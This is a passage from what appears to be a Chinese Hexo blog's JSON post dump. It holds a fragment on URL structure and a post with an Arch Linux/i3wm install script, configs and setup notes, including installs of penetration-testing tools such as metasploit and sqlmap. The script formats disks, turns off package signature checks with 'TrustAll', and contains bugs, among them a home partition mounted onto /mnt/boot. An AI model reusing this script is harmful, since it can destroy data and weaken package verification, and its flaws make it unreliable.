查询。（GET模式的窗体参数，以“?”字符为起点，每个参数以“&amp;”隔开，再以“=”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题） 片段。以“#”字符为起点 以http://www.baidu.com:80/index.html?id=250为例, 其中： http，是协议； www.baidu.com，是服务器； 80，是服务器上的默认网络端口号，默认不显示； index.html，是路径（URI：直接定位到对应的资源）； ?id=250，是查询。 大多数网页浏览器不要求用户输入网页中“http://”的部分，因为绝大多数网页内容是超文本传输协议文件。同样，“80”是超文本传输协议文件的常用端口号，因此一般也不必写明。 0x07）HTTP请求格式(请求协议) 0x08）HTTP响应格式（响应协议）","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip","slug":"tcp-ip","permalink":"http://yoursite.com/tags/tcp-ip/"}]},{"title":"网络模型","slug":"网络模型","date":"2020-01-05T06:34:30.000Z","updated":"2020-02-12T06:42:07.266Z","comments":true,"path":"2020/01/05/网络模型/","link":"","permalink":"http://yoursite.com/2020/01/05/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip","slug":"tcp-ip","permalink":"http://yoursite.com/tags/tcp-ip/"}]},{"title":"主机系统安装配置","slug":"主机系统安装配置","date":"2020-01-03T06:04:01.000Z","updated":"2020-02-26T02:40:48.468Z","comments":true,"path":"2020/01/03/主机系统安装配置/","link":"","permalink":"http://yoursite.com/2020/01/03/%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","excerpt":"","text":"1 前言2019年已经过去了，四年大学生涯也即将结束。以前的那个博客感觉写的挺乱的。这一年过的也挺乱，整天迷迷糊糊的，也不知道自己到底干了啥。最近没啥事情，趁着这个机会，从头再来吧。把东西都给梳理梳理。电脑上东西也比较多，比较乱。就先给电脑整理一下。直接重装一下。在这里做个记录。 2 规划电脑上有两块机1T的械硬盘，一个128G的ssd。打算在ssd上装一个arch，作为日常使用。留一块硬盘存放数据啥的，文件系统格式弄成ext4的，毕竟经常用linux，ext4比较方便。剩下一块硬盘转一个win10，用文档处理啥的。 gf 3 arch安装及配置3.1) 简介系统使用arch linux。 桌面使用i3-gaps(i3wm的分支)+py3status+i3lock+konsole。 shell使用zsh，用oh-my-zsh配置即可。 选择平铺桌面管理器是因为可以自动排列所有打开的窗口，所有窗口操作使用快捷键实现、最大化利用工作区、最大化利用屏幕空间、占用资源小`。 选择i3-gaps是因为i3wm的本身配置非常简单，i3-gaps在它的基础之上增加窗口间隙调整的支持，方便把桌面弄得更漂亮一些。 选择py3staus是因为它支持更多的插件和属性配置。 zsh谁用谁知道。 3.2 效果图 3.3 安装 使用方法： 下载arch linux镜像，并刻录成启动盘。调整开机启动顺序，使用光盘会u盘启动，进入系统，运行此脚本即可。 注意事项 如果是之前下载的镜像刻录的启动盘，运行此脚本前，最好先更新一下archlinux-keyring，防止下面因校验失败导致安装错误。 安装过程中会创建一个普通用户（由用户定义），i3wm及py3status的配置文件在普通用户家目录下。 安装完毕后，用户登录后不会直接启用图形界面，需要使用startx启用。也可在用户家目录下的shell配置文件中加入[[ -z $DISPLAY &amp;&amp; $XDG_VTNR -eq 1 ]] &amp;&amp; exec startx来直接启动图形界面。启用后除了右下角一片黑，此时莫慌，因为没背景图片，此现象正常。 桌面背景图片默认为创建的普通用户家目录下的picture目录中的1.jpg,锁屏文件为picture目录中的3.png。目录可在家目录下.i3/config中修改。 默认的$mod键为左alt键，可在用户家目录下的.i3/config中修改 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397#!/bin/bash# install the arch linux with i3wmif ! ping baidu.com -c 3 &amp;&gt;/dev/null ; then echo \"the network is error\"fidisk_device=`fdisk -l |awk '/^Disk \\/dev/&#123;print $2 $3$4&#125;'`echo \"you disk ilst:\"for i in $disk_devicedo echo \"$i\"doneread -p \"please choose a device to install the system(such as /dev/sda):\" disk_choosefdisk $disk_chooseif [ $? -ne 0 ];then echo \"please fdisk your disk\" exit 6firead -p \"whih partition do you want to do / )\" root_mount_pointmkfs.ext4 $root_mount_pointmount $root_mount_point /mnt &amp;&gt;/dev/nullif [ $? -ne 0 ];then echo \"mount error\" exit 8fifor i in `fdisk -l |grep ^$disk_choose|cut -d\" \" -f1`do if [ $i == $root_mount_point ];then continue fi read -p \"$i whih partition do you want to do /mnt /boot swap )\" mount_point case $mount_point in /boot) mkdir /mnt/boot mkfs.ext4 $i mount $i /mnt/boot ;; /hmoe) mkdir /mnt/home mkfs.ext4 $i mount $i /mnt/boot ;; swap) mkswap $i swapon $i ;; *) echo \"input error\" ;; esacdonesed -i \"1a \\Server = http://mirrors.163.com/archlinux/\\$repo/os/\\$arch\" /etc/pacman.d/mirrorlistsed -i \"1a \\Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/\\$repo/os/\\$arch\" /etc/pacman.d/mirrorlistpacman -Syypacstrap /mnt base linux linux-firmware gvim base-develgenfstab -U /mnt &gt;&gt; /mnt/etc/fstabarch-chroot /mnt ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimearch-chroot /mnt hwclock --systohc --utcarch-chroot /mnt sed -i \"1a \\ en_US.UTF-8 UTF-8\" /etc/locale.genarch-chroot /mnt sed -i \"1a \\ zh_CN.UTF-8 UTF-8\" /etc/locale.genarch-chroot /mnt sed -i \"1a \\ zh_TW.UTF-8 UTF-8\" /etc/locale.genarch-chroot /mnt locale-genarch-chroot /mnt echo LANG=en_US.UTF-8 &gt; /etc/locale.confarch-chroot /mnt echo myhostname &gt; /etc/hostnamearch-chroot /mnt systemctl enable dhcpcdarch-chroot /mnt passwdarch-chroot /mnt pacman -S grub os-prober efibootmgrarch-chroot /mnt grub-install --target=i386-pc $disk_choosearch-chroot /mnt grub-mkconfig -o /boot/grub/grub.cfgread -p \"please input a common user name :\" common_userarch-chroot /mnt useradd -m $common_userarch-chroot /mnt passwd $common_userarch-chroot /mnt sed -i \"/^root/a $common_user ALL=(ALL) ALL\" /etc/sudoers cat &gt;&gt; /mnt/etc/pacman.conf &lt;&lt;EOF[archlinuxcn]SigLevel = Optional TrustAllServer = https://mirrors.ustc.edu.cn/archlinuxcn/\\$archEOFarch-chroot /mnt pacman -Syyarch-chroot /mnt sudo pacman -Syu yaourtarch-chroot /mnt yaourt -S py3statusarch-chroot /mnt pacman -Syy archlinuxcn-keyringarch-chroot /mnt pacman -S alsa-utils xf86-video-vesa xorg xorg-xinit zsh git unrar zip unzip openssh glances htop iftop screenfetch tree vlc wget net-tools i3lock i3status compton rofi feh noto-fonts-emoji fcitx-im fcitx-configtool nautilus gnome-screenshot konsole fcitx-sogoupinyin wqy-zenhei netctlarch-chroot /mnt yaourt -S i3-gapsarch-chroot /mnt mkdir /home/$common_user/.i3arch-chroot /mnt touch /home/$common_user/.i3/configcat &gt;/mnt/home/$common_user/.i3/config &lt;&lt;EOF#===============设置字体===============font pango:Source Code Pro, EmojiOne Color 10#===============定义i\\$mod键为左alt键===============# customizedset \\$mod Mod1#===============设置窗口边框===============new_window nonebindsym \\$mod+t border normalbindsym \\$mod+y border pixel 1bindsym \\$mod+u border none#===============状态栏===============bindsym \\$mod+m bar mode togglebar &#123; i3bar_command i3bar -t# status_command i3status status_command py3status position bottom modifier Shift separator_symbol \" | \" colors &#123; background #000000CC #statusline #000000FF separator #B8F788 focused_workspace #B8F788 #000000AA active_workspace #FFFFFF #FFFFFFAA inactive_workspace #AAAAAA #000000AA #AAAAAA urgent_workspace #E57B85 #000000AA &#125;&#125;#===============窗口间距===============gaps inner 6gaps outer 0smart_gaps on#===============系统命令===============set \\$mode_system 注销(O) 关机(S) 重启(R) 取消(Esc)bindsym \\$mod+shift+q mode \"\\$mode_system\"mode \"\\$mode_system\" &#123; bindsym o exec i3-msg exit bindsym s exec systemctl poweroff bindsym r exec systemctl reboot bindsym Escape mode \"default\"&#125;#===============鼠标聚焦===============focus_follows_mouse no#===============锁屏快捷键===============# bindsym Mod4+l exec --no-startup-id i3lock -i '/home/huang/Pictures/Wallpapers/universe.png'bindsym Mod4+l exec --no-startup-id i3lock -i '/home/$common_user/picture/3.png'#===============自动启动fcitx===============exec --no-startup-id fcitxbindsym \\$mod+e exec nautilus#===============音量控制===============bindsym XF86AudioRaiseVolume exec --no-startup-id amixer -q sset Master 5%+bindsym XF86AudioLowerVolume exec --no-startup-id amixer -q sset Master 5%-#===============浮动窗口===============# use Mouse+Mod1 to drag floating windows to their wanted position#floating_modifier \\$mod#===============打开终端===============# bindsym \\$mod+Return exec i3-sensible-terminalbindsym \\$mod+Return exec konsole#===============关闭窗口===============bindsym Control+Mod1+w kill#===============打开dmenu===============# start dmenu (a program launcher)bindsym \\$mod+d exec --no-startup-id rofi -show run# There also is the (new) i3-dmenu-desktop which only displays applications# bindsym Mod1+d exec --no-startup-id i3-dmenu-desktop# change focus#bindsym \\$mod+\\$left focus left#bindsym \\$mod+\\$down focus down#bindsym \\$mod+\\$up focus up#bindsym \\$mod+\\$right focus right# alternatively, you can use the cursor keys:#===============窗口聚焦===============bindsym \\$mod+Left focus leftbindsym \\$mod+Down focus downbindsym \\$mod+Up focus upbindsym \\$mod+Right focus right# move focused window#bindsym \\$mod+Shift+\\$left move left#bindsym \\$mod+Shift+\\$down move down#bindsym \\$mod+Shift+\\$up move up#bindsym \\$mod+Shift+\\$right move right# alternatively, you can use the cursor keys:#===============窗口移动===============bindsym \\$mod+Shift+Left move leftbindsym \\$mod+Shift+Down move downbindsym \\$mod+Shift+Up move upbindsym \\$mod+Shift+Right move right#===============窗口拆分模式===============bindsym \\$mod+h split hbindsym \\$mod+v split v#===============切换全屏===============bindsym \\$mod+f fullscreen toggle#===============切换布局模式===============#bindsym \\$mod+s layout stacking#bindsym \\$mod+w layout tabbed#bindsym Mod1+e layout toggle split#===============切换窗口浮动===============bindsym \\$mod+Shift+space floating toggle#===============浮动/平铺聚焦切换===============bindsym \\$mod+space focus mode_toggle#===============聚焦到父窗口===============#bindsym \\$mod+a focus parent#===============聚焦到子窗口===============#bindsym Mod1+d focus child#===============添加窗口到存储===============bindsym \\$mod+Shift+minus move scratchpad#===============切换存储器中的窗口===============# Show the next scratchpad window or hide the focused scratchpad window.# If there are multiple scratchpad windows, this command cycles through them.bindsym Mod1+minus scratchpad show#===============绑定workspace快捷键===============# switch to workspacebindsym \\$mod+1 workspace 1:Infobindsym \\$mod+2 workspace 2:Webbindsym \\$mod+3 workspace 3:Workbindsym \\$mod+4 workspace 4:Workbindsym \\$mod+5 workspace 5:Workbindsym \\$mod+6 workspace 6:Workbindsym \\$mod+7 workspace 7:Workbindsym \\$mod+8 workspace 8:Otherbindsym \\$mod+9 workspace 9:Otherbindsym \\$mod+0 workspace 10:Other#==============设置workspace默认显示到LVDS1===============workspace \"1:Info\" output LVDS1workspace \"2:Web\" output LVDS1workspace \"3:Dev\" output LVDS1workspace \"4:Dev\" output LVDS1workspace \"5:Dev\" output LVDS1workspace \"6:Dev\" output LVDS1workspace \"7:Dev\" output LVDS1workspace \"8:Music\" output LVDS1workspace \"9:Other\" output LVDS1workspace \"10:Other\" output LVDS1#===============绑定移动窗口到指定workspace快捷键===============# move focused container to workspacebindsym \\$mod+Shift+1 move container to workspace 1:Infobindsym \\$mod+Shift+2 move container to workspace 2:Webbindsym \\$mod+Shift+3 move container to workspace 3:Workbindsym \\$mod+Shift+4 move container to workspace 4:Workbindsym \\$mod+Shift+5 move container to workspace 5:Workbindsym \\$mod+Shift+6 move container to workspace 6:Workbindsym \\$mod+Shift+7 move container to workspace 7:Workbindsym \\$mod+Shift+8 move container to workspace 8:Otherbindsym \\$mod+Shift+9 move container to workspace 9:Otherbindsym \\$mod+Shift+0 move container to workspace 10:Other#===============指定程序打开后出现在指定工作区===============assign [class=\"chrome\"] 2:Web# assign [class=\"idea\"] 3:Dev# assign [class=\"VirtualBox\"] 9:Other#===============重新加载配置===============# reload the configuration filebindsym \\$mod+Shift+c reload#===============重启i3===============# restart i3 inplace (preserves your layout/session, can be used to upgrade i3)bindsym \\$mod+Shift+r restart#===============退出i3===============# exit i3 (logs you out of your X session)bindsym \\$mod+Shift+e exec \"i3-nagbar -t warning -m '是否确定退出i3? 这将导致所有工作窗口被关闭.' -b '确定' 'i3-msg exit'\"#===============调整窗口大小===============# resize window (you can also use the mouse for that)mode \"resize\" &#123; # same bindings, but for the arrow keys bindsym Left resize shrink width 10 px or 10 ppt bindsym Down resize grow height 10 px or 10 ppt bindsym Up resize shrink height 10 px or 10 ppt bindsym Right resize grow width 10 px or 10 ppt # back to normal: Enter or Escape bindsym Return mode \"default\" bindsym Escape mode \"default\"&#125;#===============绑定调整窗口大小快捷键===============bindsym \\$mod+r mode \"resize\"#===============开启i3时自启动项===============exec_always --no-startup-id feh --bg-fill /home/$common_user/picture/1.jpgexec i3-config-wizardexec --no-startup-id i3-msg \"workspace 1:Info\"exec compton \\&amp;EOFarch-chroot /mnt touch /home/$common_user/.i3status.confcat &gt; /mnt/home/$common_user/.i3status.conf &lt;&lt;EOFgeneral &#123; output_format = \"i3bar\" colors = true color_good = \"#BBBBBB\" color_bad = \"#CC1616\" color_degraded = \"#55858E\" interval = 1&#125;order += \"sysdata\"order += \"cpu_usage\"order += \"cpu_temperature 0\"order += \"net_rate\"order += \"time\"order += \"battery_level\"order += \"static_string screenshot\"order += \"dpms\"sysdata &#123; format = \"已用内存： &#123;mem_used&#125;G 百分比： &#123;mem_used_percent&#125;%\" color = \"#48CCCD\"&#125;cpu_usage &#123; format = \"CPU使用： %usage\" color = \"#52D017\"&#125;cpu_temperature 0 &#123; format = \"CPU温度：♨️ %degrees °C\" max_threshold = 65 path = \"/sys/class/thermal/thermal_zone0/temp\" color = \"#CCFB5D\"&#125;net_rate &#123; interfaces = \"enp4s0f1\" format = \"下载速度：&#123;down&#125; 上传速度：&#123;up&#125;\" color = \"#FFDB58\"&#125;imap &#123; cache_timeout = 60 format = \"? &#123;unseen&#125;\" imap_server = 'imap.gmail.com' mailbox = 'INBOX' name = 'you/name' password = 'you/mail/password' port = '993' user = 'your/mail' new_mail_color = \"#F87431#F62217\" on_click 1 = 'exec google-chrome-stable https://mail.google.com/mail' color = \"#FCDFFF\"&#125;time &#123; format = \"时间： %Y-%m-%d %H:%M:%S\" color = \"#9E7BFF\"&#125;battery_level&#123; format =\"电量:&#123;icon&#125;\"&#125;static_string 'screenshot' &#123; format = \"截屏\" on_click 1 = \"exec gnome-screenshot\" color = \"#C44975\"&#125;dpms &#123; format_on = \"开启 DPMS\" format_off = \"关闭 DPMS\" color_on = \"#F9B7FF\" color_off = \"#6B9299\"&#125;EOFarch-chroot /mnt touch /home/$common_user/.xinitrccat &gt;/mnt/home/$common_user/.xinitrc &lt;&lt;EOFexport LANG=zh_CN.UTF-8export LANGUAGE=zh_CN:en_USexport LC_CTYPE=en_US.UTF-8export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=@im=fcitxexec i3exec sogou-qimpanelEOF 3.4) 使用 窗口管理 alt+0 ~ alt+9：切换工作区。 alt+左：聚焦到左边的窗口。alt+右：聚焦到右边的窗口。alt+上：聚焦到上边的窗口。alt+下：聚焦到下边的窗口。 alt+shift+左：移动当前聚焦的窗口到左边。alt+shift+右：移动当前聚焦的窗口到右边。alt+shift+上：移动当前聚焦的窗口到上边。alt+shift+下：移动当前聚焦的窗口到下边。 alt+shift+0 ~ alt+shift+9：将当前聚焦的窗口移动到指定的工作区中。 alt+H：窗口水平分离，即新创建的窗口将会出现在当前窗口的右侧。alt+V：窗口垂直分离，即新创建的窗口将会出现在当前窗口的下侧。 alt+R：调整当前聚焦的窗口的大小，在按完快捷键后再按方向键即可调整。alt+F：切换当前聚焦的窗口为全屏/非全屏。 ctrl+alt+W：关闭当前聚焦的窗口。alt+shift+space：使当前聚焦的窗口浮动。alt+space：在浮动的窗口和非浮动的窗口之间切换焦点。alt+T：切换窗口显示为边框+标题栏。alt+Y：切换窗口显示为只有1像素的边框。alt+U：切换窗口显示为没有边框也没有标题栏，默认为这种显示方式，因为边框和标题栏太丑而且太占空间了= =。 alt+shift+ -：移动当前窗口到scratchpad中，即可以在需要的时候将其调出来，不需要时将其隐藏。alt+ -：切换scratchpad中的窗口的显示与否。 系统命令 alt+回车：打开一个新的终端。 alt+E：打开dmenu，会在屏幕顶部出现一个黑色输入框，输入程序名字按回车就会打开程序。 win+L：锁屏。 alt+E：打开资源管理器。 fn+音量+：音量上调5%。fn+音量-：音量下调5%。 alt+shift+Q：调出系统命令。在调出系统命令后，按O注销会话、S关机、R重启、Esc取消。alt+shift+C：重新加载i3wm的配置文件。alt+shift+R：重新启动i3wm，不会丢失已经打开的窗口等信息。alt+shift+E：关闭i3wm，将会导致所有窗口被关闭。 4 配置 添加壁纸 配置kconsole 安装nvidia驱动 1234567pacman -S mesapacman -S xf86-input-evdevpacman -S bumblebee nvidia nvidia-utilssudo usermod -a -G bumblebee fkrvrosystemctl start bumblebeedsystemctl enable bumblebeednvidia-modprobe 安装vmware-workstation 123456789101112131415161718192021222324252627282930313233343536pacman -S vmware-workstation linux-headers cat &gt; /etc/systemd/system/vmware.service &lt;&lt;EOF[Unit]Description=VMware daemonRequires=vmware-usbarbitrator.serviceBefore=vmware-usbarbitrator.serviceAfter=network.target[Service]ExecStart=/etc/init.d/vmware startExecStop=/etc/init.d/vmware stopPIDFile=/var/lock/subsys/vmwareRemainAfterExit=yes[Install]WantedBy=multi-user.targetEOFcat &gt; /etc/systemd/system/vmware-usbarbitrator.service &lt;&lt;EOF[Unit]Description=VMware USB ArbitratorRequires=vmware.serviceAfter=vmware.service[Service]ExecStart=/usr/bin/vmware-usbarbitratorExecStop=/usr/bin/vmware-usbarbitrator --killRemainAfterExit=yes[Install]WantedBy=multi-user.targetEOFsystemctl start vmwaresystemctl start vmware-networks 安装metasploit 123pacman -S metasploit postgresqlsu - postgres -c &quot;initdb --locale en_US.UTF-8 -D &#39;&#x2F;var&#x2F;lib&#x2F;postgres&#x2F;data&#39;&quot;systemctl start postgresql.service 安装shutter 123yaourt -S shutter#如果编辑功能不能用的话，安装依赖perl-goo-canvas即可pacman -S perl-goo-canvas 安装常用软件 12pacman -S qq-linux baidunetdisk-bin netease-cloud-music wps-office proxychains-ng masscan nmap wireshark-qt sqlmap metasploit 配置hexo github 1234pacman -S npmnpm install -g cnpmcnpm install -g hexo-clicnpm install --save hexo-deployer-git 浏览器配置 1234567891011121314安装以下常用插件（可登录帐号云端同步）：Adblock Plus - 免费的广告拦截器Disable JavaScriptEasy XSSEvernote Web ClipperHackBarHTTP Header LiveOctotreeOneTabProxy SwitchyOmegaShodanTab Reloader (page auto refresh)User-Agent Switcher and ManagerWappalyzer 配置mtp 12如果文件管理器使用 GVFS （GNOME Files)，安装 gvfs-mtp 提供 MTP 支持或者是安装 gvfs-gphoto2 提供 PTP 支持。如果文件管理器使用 KIO （KDE 的 Dolphin），安装 kio-extras （KIO 的依赖包）。 配置无线 12345pacman -S wpa_supplicant netctlcp /etc/netctl/examples/wireless-wpa /etc/netctl/XXX vim /etc/netctl/XXXifconfig wlp3s0 downnetctl start XXX 5 win10安装及配置5.1 安装安装就没啥特别的，刻盘，调整启动项，安装即可。 在安装过程中有一个问题，无法创建新的分区也找不到现有的分区。这个可以通过bios把其他硬盘禁用了，只剩下要安装的那个硬盘，即可顺利安装。 5.2 配置没啥特别的，都是点点的操作。 安装完成后可以在arch中识别此启动项，在gurb引导的时候会有win10选项。 12pacman -S pacman -S os-prober ntfs-3ggrub-mkconfig -o &#x2F;boot&#x2F;grub&#x2F;grub.cfg 0x06 后话先粗略记录一下，根据后面使用再作补充。","categories":[{"name":"服务搭建","slug":"服务搭建","permalink":"http://yoursite.com/categories/%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://yoursite.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]}]}